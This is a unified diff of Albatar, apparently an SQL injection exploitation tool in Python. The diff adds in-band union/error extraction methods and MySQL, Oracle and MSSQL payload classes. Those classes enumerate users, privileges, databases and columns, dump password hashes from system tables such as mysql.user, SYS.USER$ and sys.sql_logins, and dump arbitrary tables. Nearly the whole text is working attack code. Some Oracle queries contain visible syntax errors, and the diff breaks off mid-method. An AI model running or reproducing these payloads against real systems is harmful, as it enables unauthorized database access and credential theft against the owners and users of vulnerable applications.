@@ -27,7 +27,6 @@ fmt2 = logging.Formatter('%(asctime)s %(name)s %(levelname)7s %(threadName)s - %
 
 sh = logging.StreamHandler()
 sh.setFormatter(fmt1)
-sh.setLevel(logging.INFO)
 
 fh = logging.FileHandler('albatar.log')
 fh.setFormatter(fmt2)
@@ -35,32 +34,32 @@ fh.setLevel(logging.DEBUG)
 
 logger = logging.getLogger('albatar')
 logger.setLevel(logging.DEBUG)
-
-logger.addHandler(sh)
 logger.addHandler(fh)
 
 from Queue import Queue, Empty
 from time import sleep, time
-from threading import Thread, active_count, current_thread
+from threading import Thread
 from urlparse import urlparse, urlunparse
 from string import Template
 import sys
-from collections import OrderedDict
 try:
   import requests
   from requests.auth import HTTPBasicAuth
 except ImportError:
   try:
     import pycurl
+    from StringIO import StringIO
   except ImportError:
     logger.error('python-requests or pycurl required')
-  try:
-    from cStringIO import StringIO
-  except ImportError:
-    from StringIO import StringIO
 
 def T(s, **kwargs):
   return Template(s).safe_substitute(**kwargs)
+
+def substitute_payload(payload, *args):
+    new = []
+    for arg in args:
+      new.append(arg.replace('${injection}', payload))
+    return new
 
 class Timing:
   def __enter__(self):
@@ -70,29 +69,24 @@ class Timing:
   def __exit__(self, exc_type, exc_value, traceback):
     self.time = time() - self.t1
 
-def substitute_payload(payload, *args):
-    new = []
-    for arg in args:
-      new.append(arg.replace('${injection}', payload))
-    return new
 # }}}
 
 # Requester {{{
 class Requester_HTTP_Base(object):
 
-  def __init__(self, state_tester, url, method='GET', body='', headers=[],
+  def __init__(self, response_processor, url, method='GET', body='', headers=[],
     auth_type='basic', auth_creds='', proxies={}, ssl_cert='', encode_payload=lambda x: x):
 
-    self.state_tester = state_tester
+    self.response_processor = response_processor
     self.http_opts = url, method, body, headers, auth_type, auth_creds, proxies, ssl_cert
     self.encode_payload = encode_payload
 
-  def check_state(self, payload, status_code, header_data, response_data, response_time, content_length):
+  def review_response(self, payload, status_code, header_data, response_data, response_time, content_length):
 
     stats = '%s %d:%d %.3f' % (status_code, len(header_data+response_data), int(content_length), response_time)
     logger.debug('%s %s' % (stats, payload))
 
-    return self.state_tester(header_data, response_data, response_time)
+    return self.response_processor(header_data, response_data, response_time)
 
 class Requester_HTTP_requests(Requester_HTTP_Base):
 
@@ -120,6 +114,9 @@ class Requester_HTTP_requests(Requester_HTTP_Base):
 
     headers = dict(h.split(': ', 1) for h in headers.split('\r\n') if h)
 
+    if method.upper() == 'POST':
+      headers['Content-Type'] = 'application/x-www-form-urlencoded'
+
     response = self.session.send(
       self.session.prepare_request(
         requests.Request(url=url, method=method, headers=headers, data=body)))
@@ -131,7 +128,7 @@ class Requester_HTTP_requests(Requester_HTTP_Base):
     else:
       content_length = -1
 
-    return self.check_state(payload, response.status_code, header_data, response.text, response.elapsed.total_seconds(), content_length)
+    return self.review_response(payload, response.status_code, header_data, response.text, response.elapsed.total_seconds(), content_length)
 
 class Requester_HTTP_pycurl(Requester_HTTP_Base):
 
@@ -147,7 +144,8 @@ class Requester_HTTP_pycurl(Requester_HTTP_Base):
 
     _, _, _, _, auth_type, auth_creds, proxies, ssl_cert = self.http_opts
 
-    fp.setopt(pycurl.PROXY, proxies['http'] or proxies['https'])
+    if proxies:
+      fp.setopt(pycurl.PROXY, proxies['http'] or proxies['https'])
 
     if auth_creds:
       fp.setopt(pycurl.USERPWD, auth_creds)
@@ -212,24 +210,83 @@ class Requester_HTTP_pycurl(Requester_HTTP_Base):
     content_length = fp.getinfo(pycurl.CONTENT_LENGTH_DOWNLOAD)
     header_data, response_data = header_buffer.getvalue(), response_buffer.getvalue()
 
-    return self.check_state(payload, status_code, header_data, response_data, response_time, content_length)
+    return self.review_response(payload, status_code, header_data, response_data, response_time, content_length)
 
 Requester_HTTP = Requester_HTTP_requests
 #Requester_HTTP = Requester_HTTP_pycurl
 # }}}
 
 # Method {{{
-class Method_Base:
+def make_payload(template, *args):
 
-  def __init__(self, make_requester, template, num_threads=7, rate_limit=0, confirm_char=False):
+  payload = template
+  for k, v in args:
+    kw = {k: v}
+    payload = T(payload, **kw)
+
+  return payload
+
+class Method_Base(object):
+
+  def __init__(self, make_requester, template):
     self.make_requester = make_requester
     self.template = template
+
+  def prep(self, query, start_offset, stop_offset):
+    start_index, stop_index = int(start_offset), int(stop_offset)
+
+    if isinstance(query, basestring):
+      q = query
+
+    else:
+      if stop_index == 1:
+        c, _ = query
+        total_count = self.get_row(c)
+
+        logger.info('count: %s' % repr(total_count))
+        stop_index = int(total_count[0])
+        _, q = query
+
+    logger.debug('retrieving %d rows, starting at row %d' % (stop_index-start_index, start_index))
+
+    return start_index, stop_index, q
+
+class Method_Inband(Method_Base):
+
+  def __init__(self, make_requester, template, pager=1):
+    super(Method_Inband, self).__init__(make_requester, template)
+
+    self.pager = pager
+
+  def execute(self, query, start_offset, stop_offset):
+
+    start_index, stop_index, q = self.prep(query, start_offset, stop_offset)
+
+    for row_index in range(start_index, stop_index, self.pager):
+      for r in self.get_row(q, row_index, self.pager):
+        yield r
+
+  def get_row(self, query, row_pos=0, pager=10):
+    requester = self.make_requester()
+
+    payload = make_payload(self.template, ('query', query), ('row_pos', row_pos), ('row_count', pager))
+    logger.debug('payload: %s' % payload)
+
+    return requester.test(payload)
+
+class Method_union(Method_Inband): pass
+class Method_error(Method_Inband): pass
+
+class Method_Blind(Method_Base):
+
+  def __init__(self, make_requester, template, num_threads=7, rate_limit=0, confirm_char=False):
+    super(Method_Blind, self).__init__(make_requester, template)
+
     self.num_threads = num_threads
     self.rate_limit = rate_limit
     self.confirm_char = confirm_char
 
   def execute(self, query, start_offset, stop_offset):
-    logger.info('Executing: %s' % repr(query))
 
     self.taskq = Queue()
     self.resultq = Queue()
@@ -239,38 +296,18 @@ class Method_Base:
       t.daemon = True
       t.start()
 
-    start_index, stop_index = int(start_offset), int(stop_offset)
-
-    if isinstance(query, basestring):
-      self.query = query
-
-    else:
-      if stop_index == 1:
-        self.query, _ = query
-        stop_index = int(self.get_row())
-
-      _, self.query = query
-
-    logger.debug('retrieving %d rows, starting at row %d' % (stop_index-start_index, start_index))
+    start_index, stop_index, q = self.prep(query, start_offset, stop_offset)
       
     for row_index in range(start_index, stop_index):
-      yield self.get_row(row_index)
+      yield self.get_row(q, row_index)
 
-  def get_row(self, row_pos): pass
+  def get_row(self, query, row_pos): pass
 
-  def make_payload(self, query, **kwargs):
-
-    payload = T(self.template, query=query)
-    for k, v in kwargs.iteritems():
-      payload = T(payload, **kwargs)
-
-    return payload
-
-class Method_binary(Method_Base):
+class Method_binary(Method_Blind):
   '''Binary Search'''
   pass
 
-class Method_bitwise(Method_Base):
+class Method_bitwise(Method_Blind):
   '''Bit ANDing'''
 
   def get_state(self):
@@ -282,9 +319,9 @@ class Method_bitwise(Method_Base):
         pass
     return tid, state
 
-  def get_row(self, row_pos=0):
+  def get_row(self, query, row_pos=0):
 
-    logger.debug('query: %s' % self.query)
+    logger.debug('query: %s' % query)
 
     result = ''
     char_pos = 1
@@ -292,7 +329,7 @@ class Method_bitwise(Method_Base):
       sleep(self.rate_limit)
 
       for bit_pos in range(7):
-        payload = self.make_payload(query=self.query, char_pos=char_pos, bit_mask=1<<bit_pos, row_pos=row_pos)
+        payload = make_payload(self.template, ('query', query), ('char_pos', char_pos), ('bit_mask', 1<<bit_pos), ('row_pos', row_pos))
         self.taskq.put_nowait((bit_pos, payload))
 
       char = 0
@@ -309,8 +346,7 @@ class Method_bitwise(Method_Base):
         break
 
       if self.confirm_char:
-
-        payload = self.make_payload(query=self.query, char_pos=char_pos, bit_mask=char, row_pos=row_pos)
+        payload = make_payload(self.template, ('query', query), ('char_pos', char_pos), ('bit_mask', char), ('row_pos', row_pos))
         self.taskq.put_nowait((0, payload))
 
         _, state = self.get_state()
@@ -345,15 +381,14 @@ class Method_bitwise(Method_Base):
         try:
           state = requester.test(payload)
           self.resultq.put((task_id, state))
-
           break
+
         except:
           mesg = '%s %s' % sys.exc_info()[:2]
           logger.warn('try %d, caught: %s' % (try_count, mesg))
           logger.exception(sys.exc_info()[1])
 
           sleep(try_count * 2)
-
           requester = self.make_requester()
           continue
 # }}}
@@ -370,40 +405,43 @@ class SQLi_Base:
     from optparse import OptionParser, OptionGroup
 
     usage_str = """usage: %prog [options]
-    $ %prog -q 'select version()'"""
+    $ %prog -q 'select 42'"""
 
     parser = OptionParser(usage=usage_str)
 
     parser.add_option('-d', '--debug', dest='debug', action='store_true', default=False, help='print debug messages')
+    parser.add_option('-q', '--query', dest='query', help='SQL statement to execute')
+    parser.add_option('-b', '--banner', dest='banner', action='store_true', help='')
+    parser.add_option('--current-user', dest='current_user', action='store_true', help='')
+    parser.add_option('--current-db', dest='current_db', action='store_true', help='')
+    parser.add_option('--hostname', dest='hostname', action='store_true', help='')
 
-    enumeration = OptionGroup(parser, 'Enumeration')
-    enumeration.add_option('-q', '--query', dest='query', help='SQL statement to execute')
-    enumeration.add_option('-b', '--banner', dest='banner', action='store_true', help='')
-    enumeration.add_option('--current-user', dest='current_user', action='store_true', help='')
-    enumeration.add_option('--current-db', dest='current_db', action='store_true', help='')
-    enumeration.add_option('--hostname', dest='hostname', action='store_true', help='')
+    parser.add_option('--privileges', dest='enum_privileges', action='store_true', help='')
+    parser.add_option('--roles', dest='enum_roles', action='store_true', help='')
 
-    enumeration.add_option('--privileges', dest='enum_privileges', action='store_true', help='')
-    enumeration.add_option('--roles', dest='enum_roles', action='store_true', help='')
+    parser.add_option('--users', dest='enum_users', action='store_true', help='')
+    parser.add_option('--passwords', dest='enum_passwords', action='store_true', help='')
 
-    enumeration.add_option('--users', dest='enum_users', action='store_true', help='')
-    enumeration.add_option('--passwords', dest='enum_passwords', action='store_true', help='')
+    parser.add_option('--dbs', dest='enum_dbs', action='store_true', help='')
+    parser.add_option('--tables', dest='enum_tables', action='store_true')
+    parser.add_option('--columns', dest='enum_columns', action='store_true')
+    parser.add_option('--dump', dest='dump_table', action='store_true', help='')
 
-    enumeration.add_option('--dbs', dest='enum_dbs', action='store_true', help='')
-    enumeration.add_option('--tables', dest='enum_tables', action='store_true')
-    enumeration.add_option('--columns', dest='enum_columns', action='store_true')
-    enumeration.add_option('--dump', dest='dump_table', action='store_true', help='')
+    parser.add_option('-D', dest='db', default='', metavar='', help='')
+    parser.add_option('-T', dest='table', default='', metavar='', help='')
+    parser.add_option('-C', dest='column', default='', metavar='', help='')
+    parser.add_option('-U', dest='user', default='', metavar='', help='')
 
-    enumeration.add_option('-D', dest='db', default='', metavar='', help='')
-    enumeration.add_option('-T', dest='table', default='', metavar='', help='')
-    enumeration.add_option('-C', dest='column', default='', metavar='', help='')
-    enumeration.add_option('-U', dest='user', default='', metavar='', help='')
+    parser.add_option('--start', dest='start_offset', default='0', metavar='', help='')
+    parser.add_option('--stop', dest='stop_offset', default='1', metavar='', help='')
 
-    enumeration.add_option('--start', dest='start_offset', default='0', metavar='', help='')
-    enumeration.add_option('--stop', dest='stop_offset', default='1', metavar='', help='')
-
-    parser.option_groups.extend([enumeration])
     (opts, args) = parser.parse_args(argv[1:])
+
+    if opts.debug:
+      sh.setLevel(logging.DEBUG)
+    else:
+      sh.setLevel(logging.INFO)
+    logger.addHandler(sh)
 
     queries = []
 
@@ -454,6 +492,7 @@ class SQLi_Base:
     with Timing() as timing:
       try:
         for query in queries:
+          logger.info('Executing: %s' % repr(query))
           for result in self.method.execute(query, start_offset=opts.start_offset, stop_offset=opts.stop_offset):
             yield result
       except KeyboardInterrupt:
@@ -463,14 +502,87 @@ class SQLi_Base:
 
 # }}}
 
-# MySQL {{{
+# MySQL_Inband {{{
+class MySQL_Inband(SQLi_Base):
+
+  def banner(self):
+    return '(SELECT VERSION() X)a'
+
+  def current_user(self):
+    return '(SELECT CURRENT_USER() X)a'
+
+  def current_db(self):
+    return '(SELECT DATABASE() X)a'
+
+  def hostname(self):
+    return '(SELECT @@HOSTNAME X)a'
+
+  def enum_privileges(self, user):
+    if user:
+      c = '(SELECT COUNT(*) X FROM information_schema.user_privileges WHERE grantee="%s")a' % user
+      q = '(SELECT privilege_type X FROM information_schema.user_privileges WHERE grantee="%s" LIMIT ${row_pos},${row_count})a' % user
+    else:
+      c = '(SELECT COUNT(*) X FROM information_schema.user_privileges)a'
+      q = '(SELECT CONCAT_WS(0x3a,grantee,privilege_type) X FROM information_schema.user_privileges LIMIT ${row_pos},${row_count})a'
+    return c, q
+
+  def enum_users(self):
+    c = '(SELECT COUNT(DISTINCT(grantee)) X FROM information_schema.user_privileges)a'
+    q = '(SELECT DISTINCT(grantee) X FROM information_schema.user_privileges LIMIT ${row_pos},${row_count})a'
+    return c, q
+
+  def enum_passwords(self, user):
+    if user:
+      c = '(SELECT COUNT(*) X FROM mysql.user WHERE user="%s")a' % user
+      q = '(SELECT CONCAT_WS(0x3a,host,user,password) X FROM mysql.user WHERE user="%s" LIMIT ${row_pos},${row_count})a' % user
+    else:
+      c = '(SELECT COUNT(*) X FROM mysql.user)a'
+      q = '(SELECT CONCAT_WS(0x3a,host,user,password) X FROM mysql.user LIMIT ${row_pos},${row_count})a'
+
+    return c, q
+
+  def enum_dbs(self):
+    c = '(SELECT COUNT(*) X FROM information_schema.schemata)a'
+    q = '(SELECT schema_name X FROM information_schema.schemata LIMIT ${row_pos},${row_count})a'
+    return c, q
+
+  def enum_tables(self, db):
+    if db:
+      c = '(SELECT COUNT(*) X FROM information_schema.tables WHERE table_schema="%s")a' % db
+      q = '(SELECT table_name X FROM information_schema.tables WHERE table_schema="%s" LIMIT ${row_pos},${row_count})a' % db
+
+    else:
+      c = '(SELECT COUNT(*) X FROM information_schema.tables)a'
+      q = '(SELECT CONCAT_WS(0x3a,table_schema,table_name) X FROM information_schema.tables LIMIT ${row_pos},${row_count})a'
+    return c, q
+
+  def enum_columns(self, db, table):
+    if db:
+      if table:
+        c = '(SELECT COUNT(*) X FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s")a' % (db, table)
+        q = '(SELECT column_name X FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s" LIMIT ${row_pos},${row_count})a' % (db, table)
+      else:
+        c = '(SELECT COUNT(*) X FROM information_schema.columns WHERE table_schema="%s")a' % db
+        q = '(SELECT CONCAT_WS(0x3a,table_name,column_name) X FROM information_schema.columns WHERE table_schema="%s" LIMIT ${row_pos},${row_count})a' % db
+    else:
+      c = '(SELECT COUNT(*) X FROM information_schema.columns)a'
+      q = '(SELECT CONCAT_WS(0x3a,table_schema,table_name,column_name) X FROM information_schema.columns LIMIT ${row_pos},${row_count})a'
+    return c, q
+
+  def dump_table(self, db, table, cols):
+    c = '(SELECT COUNT(*) X FROM %s.%s)a' % (db, table)
+    q = '(SELECT CONCAT_WS(0x3a,%s) X FROM %s.%s LIMIT ${row_pos},${row_count})a' % (','.join(cols), db, table)
+    return c, q
+# }}}
+
+# MySQL_Blind {{{
 class MySQL_Blind(SQLi_Base):
   
   def banner(self):
-    return 'SELECT @@VERSION'
+    return 'SELECT VERSION()'
 
   def current_user(self):
-    return 'SELECT USER()'
+    return 'SELECT CURRENT_USER()'
 
   def current_db(self):
     return 'SELECT DATABASE()'
@@ -531,7 +643,97 @@ class MySQL_Blind(SQLi_Base):
     return c, q
 # }}}
 
-# Oracle {{{
+# Oracle_Inband {{{
+class Oracle_Inband(SQLi_Base):
+
+  def banner(self):
+    c = "(SELECT UPPER(COUNT(*)) X FROM v$version)"
+    q = "(SELECT banner X,ROWNUM R FROM v$version) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"
+    return c, q
+
+  def current_user(self):
+    return "(SELECT user X FROM dual)"
+
+  def hostname(self):
+    return "(SELECT UTL_INADDR.GET_HOST_NAME X FROM dual)"
+
+  def enum_privileges(self, user):
+    if user:
+      c = "(SELECT UPPER(COUNT(*)) FROM DBA_SYS_PRIVS WHERE GRANTEE='%s')" % user.upper()
+      q = "(SELECT PRIVILEGE X,ROWNUM R FROM DBA_SYS_PRIVS WHERE GRANTEE='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count}" % user.upper()
+    else:
+      c = "(SELECT UPPER(COUNT(*)) FROM USER_SYS_PRIVS)"
+      q = "(SELECT PRIVILEGE X,ROWNUM R FROM USER_SYS_PRIVS WHERE GRANTEE='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"
+
+      return c, q
+
+  def enum_roles(self, user):
+    if user:
+      c = "(SELECT UPPER(COUNT(*)) FROM DBA_ROLE_PRIVS WHERE GRANTEE='%s'" % user.upper()
+      q = "(SELECT GRANTED_ROLE X,ROWNUM R FROM DBA_ROLE_PRIVS WHERE GRANTEE='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count)" % user.upper()
+    else:
+      c = "(SELECT UPPER(COUNT(*)) FROM USER_ROLE_PRIVS"
+      q = "(SELECT GRANTED_ROLE X,ROWNUM R FROM USER_ROLE_PRIVS) WHERE R>${row_pos} AND R<=${row_pos}+${row_count)"
+    return c, q
+
+  def enum_users(self):
+    c = "(SELECT UPPER(COUNT(*)) X FROM SYS.ALL_USERS)"
+    q = "(SELECT USERNAME X,ROWNUM R FROM SYS.ALL_USERS) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"
+    return c, q
+
+  def enum_passwords(self, user):
+    if user:
+      c = "(SELECT UPPER(COUNT(*)) X FROM SYS.USER$ WHERE NAME='%s')" % user.upper()
+      q = "(SELECT PASSWORD X,ROWNUM R FROM SYS.USER$ WHERE NAME='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count}" % user.upper()
+    else:
+      c = "(SELECT UPPER(COUNT(*)) X FROM SYS.USER$)"
+      q = "(SELECT NAME||CHR(58)||PASSWORD X,ROWNUM R FROM SYS.USER$) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"
+    return c, q
+
+  def enum_dbs(self):
+    c = "(SELECT UPPER(COUNT(*)) X FROM DISTINCT(OWNER) FROM SYS.ALL_TABLES)"
+    q = "(SELECT OWNER X, ROWNUM R FROM DISTINCT(OWNER) FROM SYS.ALL_TABLES) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"
+    return c, q
+
+  def enum_tables(self, db):
+    if db:
+      c = "(SELECT UPPER(COUNT(*)) X FROM SYS.ALL_TABLES WHERE OWNER='%s')" % db.upper()
+      q = "(SELECT TABLE_NAME X,ROWNUM R FROM SYS.ALL_TABLES WHERE OWNER='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count}" % db.upper()
+    else:
+      c = "(SELECT UPPER(COUNT(*)) X FROM SYS.ALL_TABLES)"
+      q = "(SELECT OWNER||CHR(58)||TABLE_NAME X,ROWNUM R FROM SYS.ALL_TABLES) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"
+    return c, q
+
+  def enum_columns(self, db, table):
+    if db:
+      if table:
+        c = "(SELECT UPPER(COUNT(*)) X FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s')" % (table.upper(), db.upper())
+        q = "(SELECT COLUMN_NAME X,ROWNUM R FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count}" % (table.upper(), db.upper())
+      else:
+        c = "(SELECT UPPER(COUNT(*)) X FROM SYS.ALL_TAB_COLUMNS WHERE OWNER='%s')" % db.upper()
+        q = "(SELECT TABLE_NAME||CHR(58)||COLUMN_NAME X,ROWNUM R FROM SYS.ALL_TAB_COLUMNS WHERE OWNER='%s') WHERE R>${row_pos} AND R<=${row_pos}+${row_count}" % db.upper()
+    else:
+        c = "(SELECT UPPER(COUNT(*)) X FROM SYS.ALL_TAB_COLUMNS)"
+        q = "(SELECT OWNER||CHR(58)||TABLE_NAME||CHR(58)||COLUMN_NAME X,ROWNUM R FROM SYS.ALL_TAB_COLUMNS) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}"
+    return c, q
+
+  def dump_table(self, db, table, cols):
+    if not table:
+      raise NotImplementedError('-T required')
+    if not cols:
+      raise NotImplementedError('-C required')
+
+    if db:
+      c = '(SELECT UPPER(COUNT(*)) X FROM %s.%s)' % (db, table)
+      q = '(SELECT %s X,ROWNUM R FROM %s.%s) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}' % ('||chr(58)||'.join(cols), db, table)
+    else:
+      c = '(SELECT UPPER(COUNT(*)) X FROM %s)' % table
+      q = '(SELECT %s X,ROWNUM R FROM %s) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}' % ('||chr(58)||'.join(cols), table)
+    return c, q
+
+# }}}
+
+# Oracle_Blind {{{
 class Oracle_Blind(SQLi_Base):
 
   def banner(self):
@@ -541,63 +743,61 @@ class Oracle_Blind(SQLi_Base):
     return 'SELECT user FROM dual'
 
   def hostname(self):
-    return 'SELECT UTL_INADDR.GET_HOST_NAME FROM DUAL'
+    return 'SELECT UTL_INADDR.GET_HOST_NAME FROM dual'
 
   def enum_privileges(self, user):
     if user:
-      c = "SELECT COUNT(PRIVILEGE) FROM DBA_SYS_PRIVS WHERE USERNAME='%s'" % user.upper()
-      q = "SELECT PRIVILEGE FROM (SELECT PRIVILEGE,ROWNUM-1 AS LIMIT FROM DBA_SYS_PRIVS WHERE USERNAME='%s') WHERE LIMIT=${row_pos}" % user.upper()
+      c = "SELECT COUNT(*) FROM DBA_SYS_PRIVS WHERE GRANTEE='%s'" % user.upper()
+      q = "SELECT X FROM (SELECT PRIVILEGE X,ROWNUM-1 R FROM DBA_SYS_PRIVS WHERE GRANTEE='%s') WHERE R=${row_pos}" % user.upper()
     else:
-      c = "SELECT COUNT(PRIVILEGE) FROM USER_SYS_PRIVS"
-      q = "SELECT PRIVILEGE FROM (SELECT PRIVILEGE,ROWNUM-1 AS LIMIT FROM USER_SYS_PRIVS) WHERE LIMIT=${row_pos}"
+      c = "SELECT COUNT(*) FROM USER_SYS_PRIVS"
+      q = "SELECT X FROM (SELECT PRIVILEGE X,ROWNUM-1 R FROM USER_SYS_PRIVS) WHERE R=${row_pos}"
     return c, q
 
   def enum_roles(self, user):
     if user:
-      c = "SELECT COUNT(GRANTED_ROLE) FROM DBA_ROLE_PRIVS WHERE USERNAME='%s'" % user.upper()
-      q = "SELECT GRANTED_ROLE FROM (SELECT GRANTED_ROLE,ROWNUM-1 AS LIMIT FROM DBA_ROLE_PRIVS WHERE USERNAME='%s') WHERE LIMIT=${row_pos}"  % user.upper()
-
+      c = "SELECT COUNT(*) FROM DBA_ROLE_PRIVS WHERE GRANTEE='%s'" % user.upper()
+      q = "SELECT X FROM (SELECT GRANTED_ROLE X,ROWNUM-1 R FROM DBA_ROLE_PRIVS WHERE GRANTEE='%s') WHERE R=${row_pos}"  % user.upper()
     else:
-      c = "SELECT COUNT(GRANTED_ROLE) FROM USER_ROLE_PRIVS"
-      q = "SELECT GRANTED_ROLE FROM (SELECT GRANTED_ROLE,ROWNUM-1 AS LIMIT FROM USER_ROLE_PRIVS) WHERE LIMIT=${row_pos}"
+      c = "SELECT COUNT(*) FROM USER_ROLE_PRIVS"
+      q = "SELECT X FROM (SELECT GRANTED_ROLE X,ROWNUM-1 R FROM USER_ROLE_PRIVS) WHERE R=${row_pos}"
     return c, q
 
   def enum_users(self):
-    c = 'SELECT COUNT(USERNAME) FROM SYS.ALL_USERS'
-    q = 'SELECT USERNAME FROM (SELECT USERNAME,ROWNUM-1 AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=${row_pos}'
+    c = 'SELECT COUNT(*) FROM SYS.ALL_USERS'
+    q = 'SELECT X FROM (SELECT USERNAME X,ROWNUM-1 R FROM SYS.ALL_USERS) WHERE R=${row_pos}'
     return c, q
 
   def enum_passwords(self, user):
     if user:
-      c = "SELECT COUNT(PASSWORD) FROM SYS.USER$ WHERE NAME='%s'" % user.upper()
-      q = "SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM-1 AS LIMIT FROM SYS.USER$ WHERE NAME='%s') WHERE LIMIT=${row_pos}" % user.upper()
+      c = "SELECT COUNT(*) FROM SYS.USER$ WHERE NAME='%s'" % user.upper()
+      q = "SELECT X FROM (SELECT PASSWORD X,ROWNUM-1 R FROM SYS.USER$ WHERE NAME='%s') WHERE R=${row_pos}" % user.upper()
     else:
-      c = "SELECT COUNT(PASSWORD) FROM SYS.USER$"
-      q = "SELECT NAME||':'||PASSWORD FROM (SELECT PASSWORD,ROWNUM-1 AS LIMIT FROM SYS.USER$) WHERE LIMIT=${row_pos}"
+      c = "SELECT COUNT(*) FROM SYS.USER$"
+      q = "SELECT X FROM (SELECT NAME||CHR(58)||PASSWORD X,ROWNUM-1 R FROM SYS.USER$) WHERE R=${row_pos}"
     return c, q
 
   def enum_dbs(self):
     c = 'SELECT COUNT(DISTINCT(OWNER)) FROM SYS.ALL_TABLES'
-    q = 'SELECT OWNER FROM (SELECT OWNER,ROWNUM-1 AS LIMIT FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)) WHERE LIMIT=${row_pos}'
+    q = 'SELECT X FROM (SELECT OWNER X,ROWNUM-1 R FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)) WHERE R=${row_pos}'
     return c, q
 
   def enum_tables(self, db):
     if not db:
       raise NotImplementedError('-D required')
 
-    c = "SELECT COUNT(TABLE_NAME) FROM SYS.ALL_TABLES WHERE OWNER='%s'" % db
-    q = "SELECT TABLE_NAME FROM (SELECT TABLE_NAME,ROWNUM-1 AS LIMIT FROM SYS.ALL_TABLES WHERE OWNER='%s') WHERE LIMIT=${row_pos}" % db
+    c = "SELECT COUNT(*) FROM SYS.ALL_TABLES WHERE OWNER='%s'" % db.upper()
+    q = "SELECT X FROM (SELECT TABLE_NAME X,ROWNUM-1 R FROM SYS.ALL_TABLES WHERE OWNER='%s') WHERE R=${row_pos}" % db.upper()
     return c, q
 
-  # bugfix for sqlmap
   def enum_columns(self, db, table):
     if not db:
       raise NotImplementedError('-D required')
     if not table:
       raise NotImplementedError('-T required')
 
-    c = "SELECT COUNT(COLUMN_NAME) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s'" % (table, db)
-    q = "SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME,ROWNUM-1 AS LIMIT FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s') WHERE LIMIT=${row_pos}" % (table, db)
+    c = "SELECT COUNT(*) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s'" % (table.upper(), db.upper())
+    q = "SELECT X FROM (SELECT COLUMN_NAME X,ROWNUM-1 R FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s') WHERE R=${row_pos}" % (table.upper(), db.upper())
     return c, q
 
   def dump_table(self, db, table, cols):
@@ -608,13 +808,81 @@ class Oracle_Blind(SQLi_Base):
     if not cols:
       raise NotImplementedError('-C required')
 
-    c = "SELECT COUNT(*) FROM %s" % table
-    q = "SELECT ENTRY_VALUE FROM (SELECT %s AS ENTRY_VALUE,ROWNUM-1 AS LIMIT FROM %s) WHERE LIMIT=${row_pos}" % ('||chr(58)||'.join(cols), table)
+    c = "SELECT COUNT(*) FROM %s" % table.upper()
+    q = "SELECT X FROM (SELECT %s X,ROWNUM-1 R FROM %s) WHERE R=${row_pos}" % ('||chr(58)||'.join(cols), table.upper())
     return c, q
 
 # }}}
 
-# MSSQL {{{
+# MSSQL_Inband {{{
+class MSSQL_Inband(SQLi_Base):
+
+  def banner(self):
+    return '(SELECT @@VERSION X)a'
+
+  def current_user(self):
+    return '(SELECT SYSTEM_USER X)a'
+
+  def current_db(self):
+    return '(SELECT DB_NAME() X)a'
+
+  def hostname(self):
+    return '(SELECT @@SERVERNAME X)a'
+
+  def enum_users(self):
+    c = '(SELECT LTRIM(STR(COUNT(*))) X FROM master..syslogins)a'
+    q = '(SELECT TOP ${row_count} name X FROM master..syslogins WHERE name' \
+        ' NOT IN (SELECT TOP ${row_pos} name FROM master..syslogins))a'
+    return c, q
+
+  def enum_passwords(self, user):
+    c = "(SELECT LTRIM(STR(COUNT(*))) X FROM master.sys.sql_logins)a"
+    q = "(SELECT TOP ${row_count} name+char(58)+CAST(master.dbo.fn_varbintohexstr(password_hash) AS NVARCHAR(4000)) X FROM sys.sql_logins WHERE name" \
+        " NOT IN (SELECT TOP ${row_pos} name FROM master..syslogins))a"
+    return c, q
+
+  def enum_dbs(self):
+    c = '(SELECT LTRIM(STR(COUNT(*))) X FROM master..sysdatabases)a'
+    q = '(SELECT TOP ${row_count} name X FROM master..sysdatabases WHERE name' \
+        ' NOT IN (SELECT TOP ${row_pos} name FROM master..sysdatabases))a'
+    return c, q
+
+  def enum_tables(self, db):
+    if not db:
+      raise NotImplementedError('-D required')
+
+    c = T('(SELECT LTRIM(STR(COUNT(*))) X FROM ${db}..sysobjects WHERE xtype=CHAR(85))a', db=db)
+    q = T('(SELECT TOP ${row_count} name X FROM ${db}..sysobjects WHERE xtype=CHAR(85) AND name' \
+         ' NOT IN (SELECT TOP ${row_pos} name FROM ${db}..sysobjects WHERE xtype=CHAR(85)))a', db=db)
+    return c, q
+
+  def enum_columns(self, db, table):
+    if not db:
+      raise NotImplementedError('-D required')
+    if not table:
+      raise NotImplementedError('-T required')
+
+    c = T("(SELECT LTRIM(STR(COUNT(*))) X FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}')a", db=db, table=table)
+    q = T("(SELECT TOP ${row_count} x.name X FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}'" \
